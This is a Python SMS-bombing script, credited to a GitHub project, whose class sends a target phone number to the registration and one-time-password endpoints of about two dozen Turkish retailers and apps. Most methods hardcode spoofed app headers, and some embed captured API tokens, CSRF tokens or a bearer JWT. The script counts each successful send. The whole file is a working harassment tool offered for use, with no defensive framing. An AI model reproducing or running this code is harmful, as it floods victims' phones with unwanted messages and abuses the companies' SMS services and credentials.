#Credits : https://github.com/tingirifistik/Enough-Reborn
import subprocess, sys, os

try:
    import requests, urllib3, uuid, colorama
except ImportError:
    print("Gerekli modüller indiriliyor...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "urllib3==1.26.13", "uuid==1.30", "colorama==0.3.9", "requests==2.31.0"])
finally:
    import concurrent.futures, json, os, random, requests, string, time, urllib, urllib3, uuid

from colorama import Fore, Style
from time import sleep
from os import system
from concurrent.futures import ThreadPoolExecutor, wait
import requests
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style
import requests, urllib3, uuid
import requests
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style
import requests, urllib3, uuid


class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(20))+"@gmail.com"


    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Page-Url": "/kayit-ol", "Content-Type": "application/json;charset=utf-8", "Positive-Client": "kahvedunyasi", "Positive-Client-Type": "web", "Store-Id": "1", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "close"}
            json={"mobile_number": self.phone, "token_type": "register_token"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
        
     
    #wmf.com.tr
    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            }, timeout=6)
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")


    #englishhome.com
    def Englishhome(self):
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"Phone": "+90"+self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isError"] == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
            

    #icq.net
    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.json()["response"]["statusCode"] == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
          

    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC", "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4", "Accept-Language": "en"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
            

    #tazi.tech
    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
            
    
    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com") 


    #heyscooter.com.tr
    def Hey(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")

        
    #bisu.com.tr
    def Bisu(self):
        try:
            url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Device-Platform": "IOS", "X-Build-Version-Name": "9.4.0", "Authorization": "0561b4dd-e668-48ac-b65e-5afa99bf098e", "X-Build-Version-Code": "22", "Accept": "*/*", "X-Device-Manufacturer": "Apple", "X-Device-Locale": "en", "X-Client-Device-Id": "66585653-CB6A-48CA-A42D-3F266677E3B5", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Model": "iPhone 7 Plus", "X-Build-Type": "Release"}
            data = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["errors"] == None:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bisu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bisu.com.tr")


    #345dijital.com
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
            else:
                raise
        except:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
            self.adet += 1


    #macrocenter.com.tr
    def Macro(self):
        try:
            url = "https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.macrocenter.com.tr/kayit", "Content-Type": "application/json", "X-Forwarded-Rest": "true", "X-Pwa": "true", "X-Device-Pwa": "true", "Origin": "https://www.macrocenter.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"email": self.mail, "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> macrocenter.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> macrocenter.com.tr")


    #tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
    

    #ayyildiz.com.tr
    def Ayyildiz(self):
        try:
            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
                self.adet += 1
            else:
                raise      
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")


    #naosstars.com
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")


    #istegelsin.com
    def Istegelsin(self):
        try:
            url = "https://prod.fasapi.net:443/"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "App-Version": "2528", "Accept-Encoding": "gzip, deflate", "Platform": "IOS", "User-Agent": "ig-sonkullanici-ios/161 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9"}
            json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": f"90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["sendOtp2"]["alreadySent"] == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")


    #koton.com
    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")


    #hayatsu.com.tr
    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.hayatsu.com.tr/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM", "Origin": "https://www.hayatsu.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["is_success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr")


    #hizliecza.com.tr
    def Hizliecza(self):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "Bearer null"}
            json={"otpOperationType": 2, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizlieczaprodapi.hizliecza.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")


    #ipragaz.com.tr
    def Ipragaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            headers = {"Content-Type": "application/json", "X-Api-Token": "", "Authorization": "", "App-Version": "1.3.9", "App-Lang": "en", "Accept": "*/*", "App-Name": "ipragaz-mobile", "Os": "ios", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate", "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4", "App-Build": "41", "Os-Version": "15.7.7", "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8", "Connection": "close"}
            json={"birthDate": "2/7/2000", "carPlate": "31 ABC 31", "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", "name": "Memati Bas", "otp": "", "phoneNumber": self.phone, "playerId": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")


    #metro-tr.com
    def Metro(self):
        try:
            url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Applicationversion": "2.1.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Connection": "close"}
            json={"methodType": "2", "mobilePhoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["status"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> feature.metro-tr.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> feature.metro-tr.com")

    
    #qumpara.com
    def Qumpara(self):
        try:
            url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "qumpara/4.2.53 (iPhone; iOS 15.7.7; Scale/3.00)", "Accept-Language": "en-TR;q=1, tr-TR;q=0.9"}
            json={"msisdn": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tr-api.fisicek.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tr-api.fisicek.com")


    #paybol.com.tr
    def Paybol(self):
        try:
            url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Paybol/1.2.1 (com.app.paybol; build:1; iOS 15.7.7) Alamofire/5.5.0", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json={"phone_number": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["status"] == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pyb-mobileapi.walletgate.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")

        
